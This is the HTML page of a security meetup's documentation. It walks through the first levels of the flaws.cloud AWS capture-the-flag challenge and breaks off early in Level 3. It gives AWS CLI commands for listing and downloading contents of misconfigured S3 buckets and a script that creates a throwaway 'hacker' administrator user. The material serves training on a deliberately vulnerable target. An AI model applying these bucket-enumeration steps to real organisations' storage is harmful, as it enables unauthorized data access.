@@ -1,0 +1,981 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <meta content="default-src 'none'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'" http-equiv="Content-Security-Policy" />
+<meta content="nosniff" http-equiv="X-Content-Type-Options" />
+<meta content="deny" http-equiv="X-Frame-Options" />
+<meta content="1; mode=block" http-equiv="X-XSS-Protection" />
+<meta content="strict-origin" http-equiv="Referrer-Policy" />
+<meta content="max-age=31536000; includeSubDomains" http-equiv="Strict-Transport-Security" />
+<meta content="'*'" http-equiv="Access-Control-Allow-Origin" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>3.2. flaws &mdash; South Bay WASP 1.0.3 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+    <link rel="next" title="3.3. MoinMoin" href="moinmoin.html" />
+    <link rel="prev" title="3.1. Finding and running challenges" href="VWADP.html" /> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="VWADP.html">3.1. Finding and running challenges</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">3.2. flaws</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#flaws-cloud-aws-challenge">3.2.1. flaws.cloud AWS challenge</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#the-challenge">3.2.1.1. The challenge</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#the-aws-vulnerabilities">3.2.1.2. The AWS vulnerabilities</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#id22">3.2.2. flaws.cloud Level 1</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#level-1-aws-background">3.2.2.1. Level 1 AWS background</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#where-s-the-level-1-website-hosted">3.2.2.2. Where’s the Level 1 website hosted?</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#anonymous-aws-s3-bucket-access">3.2.2.3. Anonymous AWS S3 bucket access</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#id23">3.2.3. flaws.cloud Level 2</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#level-2-aws-background">3.2.3.1. Level 2 AWS background</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#allusers-bucket-access-fails">3.2.3.2. AllUsers bucket access fails</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#authenticatedusers-bucket-access-succeeds">3.2.3.3. AuthenticatedUsers bucket access succeeds</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#id24">3.2.4. flaws.cloud Level 3</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#level-3-aws-background">3.2.4.1. Level 3 AWS background</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#allusers-bucket-access">3.2.4.2. AllUsers bucket access</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#analyze-the-git-repo">3.2.4.3. Analyze the git repo</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#audit-the-compromised-keys">3.2.4.4. Audit the compromised keys</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#id25">3.2.5. flaws.cloud Level 4</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#level-4-aws-background">3.2.5.1. Level 4 AWS background</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#verify-level-4-is-an-ec2-instance">3.2.5.2. Verify Level 4 is an EC2 instance</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#exploit-public-snapshot">3.2.5.3. Exploit public snapshot</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#id26">3.2.6. flaws.cloud Level 5</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#level-5-aws-background">3.2.6.1. Level 5 AWS background</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#exploit-the-proxy-to-get-meta-data">3.2.6.2. Exploit the proxy to get meta-data</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#id27">3.2.7. flaws.cloud Level 6</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#level-6-aws-background">3.2.7.1. Level 6 AWS background</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#exploit-securityaudit-policy">3.2.7.2. Exploit SecurityAudit policy</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#cleaning-up">3.2.8. Cleaning Up</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="moinmoin.html">3.3. MoinMoin</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.4. OwlNest</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.5. De-ICE Level 6</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.6. De-ICE Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.7. De-ICE Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.8. De-ICE Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.9. De-ICE Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.10. De-ICE Level 1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.11. Underdist: 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.12. Kioptrix Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.13. Kioptrix Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.14. Kioptrix Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.15. Kioptrix Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.16. Kioptrix Level 1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.17. Security Shepherd Web App Levels</a></li>
+<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.18. Holynix2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.19. Holynix1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.20. Freshly</a></li>
+<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.21. ZorZ</a></li>
+<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.22. Vulnix</a></li>
+<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.23. Google’s XSS Game</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.24. Owning the Database with SQLMap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.25. PentesterLab From SQL injection to Shell II</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.26. PentesterLab From SQL injection to Shell</a></li>
+<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.27. SkyTower1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.28. Exploit Exercises Nebula</a></li>
+<li class="toctree-l2"><a class="reference internal" href="natas.html">3.29. Natas</a></li>
+<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.30. try2hack.nl</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
+        
+      <li>3.2. flaws</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/challenges/flaws.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="flaws-aws">
+<span id="id21"></span><h1>3.2. flaws<a class="headerlink" href="#flaws-aws" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="flaws-cloud-aws-challenge">
+<h2>3.2.1. flaws.cloud AWS challenge<a class="headerlink" href="#flaws-cloud-aws-challenge" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="the-challenge">
+<h3>3.2.1.1. The challenge<a class="headerlink" href="#the-challenge" title="Permalink to this headline">¶</a></h3>
+<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="http://flaws.cloud/">flaws</a>. For other writeups see <a class="reference external" href="https://github.com/mzet-/ctf-writeups/blob/master/flaws.cloud/flaws.cloud.md">mzet-/ctf-writeups - flaws.cloud</a> (concise and uses <code class="docutils literal notranslate"><span class="pre">Scout2</span></code>) along with <a class="reference external" href="https://gist.github.com/dboyd13/ba106b92ad6b795100b766f7c86e532f">dboyd13/flaws.cloud.md</a>.</p>
+</div>
+<div class="section" id="the-aws-vulnerabilities">
+<h3>3.2.1.2. The AWS vulnerabilities<a class="headerlink" href="#the-aws-vulnerabilities" title="Permalink to this headline">¶</a></h3>
+<ul class="simple">
+<li>AWS S3 bucket ACLs allowing AllUsers or AuthenticatedUsers listing bucket contents.</li>
+<li>AWS keys stored in a git repository.</li>
+<li>AWS EC2 snapshot publicly available.</li>
+<li>Proxy server allowing access to AWS EC2 <a class="reference external" href="http://169.254.169.254/">http://169.254.169.254/</a> metadata.</li>
+<li>Excessive permissions (SecurityAudit).</li>
+</ul>
+</div>
+</div>
+<div class="section" id="id22">
+<h2>3.2.2. <a class="reference external" href="http://flaws.cloud">flaws.cloud Level 1</a><a class="headerlink" href="#id22" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="level-1-aws-background">
+<h3>3.2.2.1. Level 1 AWS background<a class="headerlink" href="#level-1-aws-background" title="Permalink to this headline">¶</a></h3>
+<p><a class="reference external" href="http://flaws.cloud/">flaws</a> has followed <a class="reference external" href="https://docs.aws.amazon.com/AmazonS3/latest/dev/website-hosting-custom-domain-walkthrough.html">AWS S3 - Example: Setting up a Static Website Using a Custom Domain</a> to host a static website using S3. <code class="docutils literal notranslate"><span class="pre">whois</span> <span class="pre">flaws.com</span></code> shows the registrar is <a class="reference external" href="https://www.gandi.net/">gandi.net</a> with DNS hosted at Amazon Route 53 (also shown via <code class="docutils literal notranslate"><span class="pre">dig</span> <span class="pre">+short</span> <span class="pre">-t</span> <span class="pre">NS</span> <span class="pre">flaws.cloud.</span></code>). Using Route 53’s DNS alias support solves <a class="reference external" href="https://stackoverflow.com/questions/656009/how-to-overcome-root-domain-cname-restrictions">How to overcome root domain CNAME restrictions?</a>.</p>
+<p><code class="docutils literal notranslate"><span class="pre">dig</span> <span class="pre">+short</span> <span class="pre">-x</span> <span class="pre">$(dig</span> <span class="pre">+short</span> <span class="pre">flaws.cloud)</span></code> shows that the website is hosted at <em>s3-website-us-west-2.amazonaws.com.</em> From <a class="reference external" href="https://docs.aws.amazon.com/AmazonS3/latest/dev/WebsiteEndpoints.html">AWS S3 - Website Endpoints</a> this means the AWS S3 bucket flaws.cloud is in AWS region us-west-2 (Oregon), was configured for HTTP access but does not support HTTPS, and only supports publicly readable content via the following S3 bucket policy:</p>
+<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
+  <span class="nt">&quot;Version&quot;</span><span class="p">:</span><span class="s2">&quot;2012-10-17&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;Statement&quot;</span><span class="p">:[{</span>
+<span class="hll">        <span class="nt">&quot;Sid&quot;</span><span class="p">:</span><span class="s2">&quot;PublicReadGetObject&quot;</span><span class="p">,</span>
+</span><span class="hll">        <span class="nt">&quot;Effect&quot;</span><span class="p">:</span><span class="s2">&quot;Allow&quot;</span><span class="p">,</span>
+</span><span class="hll">          <span class="nt">&quot;Principal&quot;</span><span class="p">:</span> <span class="s2">&quot;*&quot;</span><span class="p">,</span>
+</span><span class="hll">      <span class="nt">&quot;Action&quot;</span><span class="p">:[</span><span class="s2">&quot;s3:GetObject&quot;</span><span class="p">],</span>
+</span><span class="hll">      <span class="nt">&quot;Resource&quot;</span><span class="p">:[</span><span class="s2">&quot;arn:aws:s3:::flaws.cloud/*&quot;</span>
+</span>      <span class="p">]</span>
+    <span class="p">}</span>
+  <span class="p">]</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>Note that this only supports s3:GetObject and not the complete list of <a class="reference external" href="https://docs.aws.amazon.com/IAM/latest/UserGuide/list_amazons3.html">AWS IAM - Actions, Resources, and Condition Keys for Amazon S3</a>, especially not s3:ListBucket (list bucket contents). But AWS S3 buckets can be misconfigured to allow access from one of the Amazon S3 Predefined Groups in <a class="reference external" href="https://docs.aws.amazon.com/AmazonS3/latest/dev/acl-overview.html">Amazon S3 - Access Control List (ACL) Overview</a>, specifically AllUsers (including anonymous or unauthenticated principals) or AuthenticatedUsers (any user with some AWS account). Note that ACLs are but one way to set permissions: see <a class="reference external" href="https://aws.amazon.com/blogs/security/iam-policies-and-bucket-policies-and-acls-oh-my-controlling-access-to-s3-resources/">IAM Policies and Bucket Policies and ACLs! Oh, My! (Controlling Access to S3 Resources)</a>.</p>
+<p>AWS uses REST requests (see <a class="reference external" href="https://en.wikipedia.org/wiki/Representational_state_transfer">Representational state transfer</a>). They are authenticated by <a class="reference external" href="https://docs.aws.amazon.com/general/latest/gr/signing_aws_api_requests.html">Signing AWS API Requests</a> using AWS account access keys consisting of a 20-character access key ID and a 40-character secret access key. (For more detail see <a class="reference external" href="https://docs.aws.amazon.com/AmazonS3/latest/dev/MakingRequests.html">Amazon S3 - Making Requests</a>, <a class="reference external" href="https://docs.aws.amazon.com/AmazonS3/latest/dev/RESTAuthentication.html">AWS S3 - Signing and Authenticating REST Requests</a>, <a class="reference external" href="https://docs.aws.amazon.com/AmazonS3/latest/API/sig-v4-authenticating-requests.html">AWS S3 - Authenticating Requests (AWS Signature Version 4)</a>, for actual Python code <a class="reference external" href="https://docs.aws.amazon.com/general/latest/gr/sigv4-signed-request-examples.html">AWS - Examples of the Complete Version 4 Signing Process (Python)</a>.)</p>
+<p>To make an unauthenticated (unsigned) request (as AllUsers) use <code class="docutils literal notranslate"><span class="pre">aws</span> <span class="pre">--no-sign-request</span> <span class="pre">...</span></code>. To make an authenticated request (as AuthenticatedUsers) use a temporary AWS account and IAM user not tied to any personal account.</p>
+</div>
+<div class="section" id="where-s-the-level-1-website-hosted">
+<h3>3.2.2.2. Where’s the Level 1 website hosted?<a class="headerlink" href="#where-s-the-level-1-website-hosted" title="Permalink to this headline">¶</a></h3>
+<p>One of the first reconnaisance steps is to get an idea where a website is hosted:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
+<span class="nv">D</span><span class="o">=</span>flaws.cloud
+<span class="hll">dig <span class="nv">$DNS</span> +short -x <span class="k">$(</span>dig +short <span class="nv">$D</span><span class="k">)</span>
+</span><span class="c1"># Output: s3-website-us-west-2.amazonaws.com.</span>
+</pre></div>
+</div>
+<p>So flaws.cloud is hosted on the S3 bucket flaws.cloud in region us-west-2.</p>
+</div>
+<div class="section" id="anonymous-aws-s3-bucket-access">
+<h3>3.2.2.3. Anonymous AWS S3 bucket access<a class="headerlink" href="#anonymous-aws-s3-bucket-access" title="Permalink to this headline">¶</a></h3>
+<p>Test for anonymous (AllUsers) s3:ListBucket access to bucket flaws.cloud:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
+<span class="nv">D</span><span class="o">=</span>flaws.cloud
+<span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short -x <span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span><span class="k">)</span> <span class="se">\</span>
+  <span class="p">|</span> sed <span class="s1">&#39;s/^.*website.//;s/.amazonaws.com\.$//&#39;</span><span class="k">)</span>
+<span class="c1"># --no-sign-request doesn&#39;t sign the request (credentials not used)</span>
+<span class="hll">aws --no-sign-request --region <span class="nv">$REGION</span> <span class="se">\</span>
+</span><span class="hll">  s3 ls s3://<span class="nv">$D</span>/
+</span><span class="hll"><span class="c1"># Output includes: secret-dd02c7c.html</span>
+</span><span class="hll">aws --no-sign-request --region <span class="nv">$REGION</span> <span class="se">\</span>
+</span><span class="hll">  s3 cp s3://<span class="nv">$D</span>/secret-dd02c7c.html .
+</span><span class="hll">cat secret-dd02c7c.html
+</span><span class="hll"><span class="c1"># Output includes: Level 2 is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</span>
+</span></pre></div>
+</div>
+<p>Permitting s3:ListBucket allows listing the website’s bucket content leading to more reconnaissance, and in this simple case the “exploit”.</p>
+</div>
+</div>
+<div class="section" id="id23">
+<h2>3.2.3. <a class="reference external" href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/">flaws.cloud Level 2</a><a class="headerlink" href="#id23" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="level-2-aws-background">
+<h3>3.2.3.1. Level 2 AWS background<a class="headerlink" href="#level-2-aws-background" title="Permalink to this headline">¶</a></h3>
+<p>Use an <a class="reference external" href="https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/">AWS Free Tier</a> account for stealth (though not necessary for flaws.cloud). Here’s the AWS CLI to add/delete an IAM administrative user:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">HACKER</span><span class="o">=</span>hacker
+<span class="nv">HACKERGROUP</span><span class="o">=</span>Administrators
+<span class="nv">PASSWORD</span><span class="o">=</span><span class="s1">&#39;PleaseChangeMeS00n!&#39;</span><span class="nv">$RANDOM$RANDOM</span>
+
+<span class="hll"><span class="c1"># create user</span>
+</span>aws iam create-user --user-name <span class="nv">$HACKER</span> --output json <span class="p">|</span> tee <span class="nv">$HACKER</span>-create.json
+chmod <span class="m">600</span> <span class="nv">$HACKER</span>-create.json
+
+<span class="hll"><span class="c1"># access to the AWS Management Console</span>
+</span>aws iam create-login-profile --user <span class="nv">$HACKER</span> --password <span class="nv">$PASSWORD</span> --no-password-reset-required
+
+<span class="hll"><span class="c1"># programmatic access</span>
+</span>aws iam create-access-key --user-name <span class="nv">$HACKER</span> --output json <span class="p">|</span> tee <span class="nv">$HACKER</span>-keys.json
+chmod <span class="m">600</span> <span class="nv">$HACKER</span>-keys.json
+<span class="nv">AK</span><span class="o">=</span><span class="k">$(</span>jq -r <span class="s1">&#39;.AccessKey.AccessKeyId&#39;</span> <span class="nv">$HACKER</span>-keys.json<span class="k">)</span>
+<span class="nv">SAK</span><span class="o">=</span><span class="k">$(</span>jq -r <span class="s1">&#39;.AccessKey.SecretAccessKey&#39;</span> <span class="nv">$HACKER</span>-keys.json<span class="k">)</span>
+
+<span class="hll"><span class="c1"># add user to group</span>
+</span>aws iam add-user-to-group --user-name <span class="nv">$HACKER</span> --group-name <span class="nv">$HACKERGROUP</span>
+
+<span class="hll"><span class="c1"># set up profile</span>
+</span>cat <span class="s">&lt;&lt;EOF | aws configure --profile $HACKER</span>
+<span class="s">$AK</span>
+<span class="s">$SAK</span>
+<span class="s">$REGION</span>
+<span class="s">json</span>
+<span class="s">EOF</span>
+
+<span class="hll"><span class="c1"># test profile</span>
+</span>aws --profile <span class="nv">$HACKER</span> iam get-user --output text --query <span class="s1">&#39;User.Arn&#39;</span>
+</pre></div>
+</div>
+<p id="flaws-delete-user">The corresponding code to delete the user is:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># *********************</span>
+<span class="hll"><span class="c1"># when done delete user</span>
+</span><span class="c1"># *********************</span>
+<span class="nv">HACKER</span><span class="o">=</span>hacker
+<span class="hll">aws iam delete-login-profile --user-name <span class="nv">$HACKER</span>
+</span><span class="hll"><span class="nv">GS</span><span class="o">=</span><span class="k">$(</span>aws iam list-groups-for-user --user-name <span class="nv">$HACKER</span> --output text <span class="se">\</span>
+</span><span class="hll">       --query <span class="s1">&#39;Groups[].GroupName&#39;</span><span class="k">)</span>
+</span><span class="hll"><span class="k">for</span> G in <span class="nv">$GS</span><span class="p">;</span> <span class="k">do</span>
+</span><span class="hll">  aws iam remove-user-from-group --group-name <span class="nv">$G</span>  --user-name <span class="nv">$HACKER</span>
+</span><span class="hll"><span class="k">done</span>
+</span><span class="hll"><span class="nv">KS</span><span class="o">=</span><span class="k">$(</span>aws iam list-access-keys --user-name <span class="nv">$HACKER</span> --output text <span class="se">\</span>
+</span><span class="hll">       --query <span class="s1">&#39;AccessKeyMetadata[].AccessKeyId&#39;</span><span class="k">)</span>
+</span><span class="hll"><span class="k">for</span> K in <span class="nv">$KS</span><span class="p">;</span> <span class="k">do</span>
+</span><span class="hll">  aws iam delete-access-key --user-name <span class="nv">$HACKER</span> --access-key-id <span class="nv">$K</span>
+</span><span class="hll"><span class="k">done</span>
+</span><span class="hll">aws iam delete-user --user-name <span class="nv">$HACKER</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="allusers-bucket-access-fails">
+<h3>3.2.3.2. AllUsers bucket access fails<a class="headerlink" href="#allusers-bucket-access-fails" title="Permalink to this headline">¶</a></h3>
+<p>Accessing the Level 2 bucket <em>level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</em> without signing fails:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
+<span class="nv">D</span><span class="o">=</span>level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+<span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short -x <span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span><span class="k">)</span> <span class="se">\</span>
+  <span class="p">|</span> sed <span class="s1">&#39;s/^.*website.//;s/.amazonaws.com\.$//&#39;</span><span class="k">)</span>
+<span class="hll">aws --no-sign-request --region <span class="nv">$REGION</span> <span class="se">\</span>
+</span><span class="hll">  s3 ls s3://<span class="nv">$D</span>/
+</span><span class="hll"><span class="c1"># Output: An error occurred (AccessDenied) when calling the ListObjects operation: Access Denied</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="authenticatedusers-bucket-access-succeeds">
+<h3>3.2.3.3. AuthenticatedUsers bucket access succeeds<a class="headerlink" href="#authenticatedusers-bucket-access-succeeds" title="Permalink to this headline">¶</a></h3>
+<p>From <a class="reference external" href="https://docs.aws.amazon.com/AmazonS3/latest/dev/acl-overview.html">Amazon S3 - Access Control List (ACL) Overview</a> <em>Amazon S3 Predefined Groups</em>, permissions are not set using the AllUsers group. But perhaps it uses the AuthenticatedUsers group (any principal with an AWS account). To check out create a throw-away user (following the code above) then:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">HACKER</span><span class="o">=</span>hacker
+<span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
+<span class="nv">D</span><span class="o">=</span>level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+<span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short -x <span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span> <span class="p">|</span> tail -n <span class="m">1</span><span class="k">)</span> <span class="se">\</span>
+  <span class="p">|</span> sed <span class="s1">&#39;s/^.*website.//;s/.amazonaws.com\.$//&#39;</span><span class="k">)</span>
+
+<span class="hll">aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> s3 ls s3://<span class="nv">$D</span>/
+</span><span class="hll"><span class="c1"># Output includes: secret-e4443fc.html</span>
+</span><span class="hll">aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> s3 cp s3://<span class="nv">$D</span>/secret-e4443fc.html .
+</span><span class="hll">cat secret-e4443fc.html
+</span><span class="hll"><span class="c1"># Output includes: Level 3 is at http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</span>
+</span></pre></div>
+</div>
+<p>Level 2 is just Level 1 using an AuthenticatedUser (with s3:ListBucket and s3:GetObject action permissions).</p>
+</div>
+</div>
+<div class="section" id="id24">
+<h2>3.2.4. <a class="reference external" href="http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/">flaws.cloud Level 3</a><a class="headerlink" href="#id24" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="level-3-aws-background">
+<h3>3.2.4.1. Level 3 AWS background<a class="headerlink" href="#level-3-aws-background" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="aws-reconnaissance">
+<h4>3.2.4.1.1. AWS reconnaissance<a class="headerlink" href="#aws-reconnaissance" title="Permalink to this headline">¶</a></h4>
+<p>Use <a class="reference external" href="https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html">AWS Security Audit Guidelines</a> to assess recently compromised credentials. <a class="reference external" href="https://www.owasp.org/images/c/cc/AWS_Security_-_Staying_on_Top_of_the_Cloud.pdf">AWS Security - Staying on Top of the Cloud</a> mentions these tools:</p>
+<ul>
+<li><p class="first"><a class="reference external" href="https://github.com/dxa4481/truffleHog">Truffle Hog</a></p>
+<p>Searches through git repositories for secrets, digging deep into commit history and branches. This is effective at finding secrets accidentally committed.</p>
+</li>
+<li><p class="first"><a class="reference external" href="https://github.com/nccgroup/AWS-recipes">AWS-recipes</a></p>
+<p>Not useful in this context, but useful for study of policy content.</p>
+</li>
+<li><p class="first"><a class="reference external" href="https://github.com/nccgroup/Scout2">AWS Scout2</a></p>
+<p>Scout2 is a security tool that lets AWS administrators assess their environment’s security posture. It produces an html report.  Needed permissions are AWS Managed Policies ReadOnlyAccess and SecurityAudit, though interesting results are possible without those permissions. See <a class="reference external" href="https://github.com/nccgroup/Scout2/wiki">AWS Scout2 Wiki</a> for more information.</p>
+</li>
+</ul>
+</div>
+<div class="section" id="aws-sts">
+<h4>3.2.4.1.2. AWS STS<a class="headerlink" href="#aws-sts" title="Permalink to this headline">¶</a></h4>
+<p>Amazon STS (Security Token Service) allows creation of <a class="reference external" href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp.html">AWS IAM - Temporary Security Credentials</a>. For this level the only <a class="reference external" href="https://docs.aws.amazon.com/cli/latest/reference/sts/index.html">AWS CLI - sts</a> command used is <a class="reference external" href="https://docs.aws.amazon.com/cli/latest/reference/sts/get-caller-identity.html">AWS CLI - sts get-caller-identity</a>.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># iam call errors out</span>
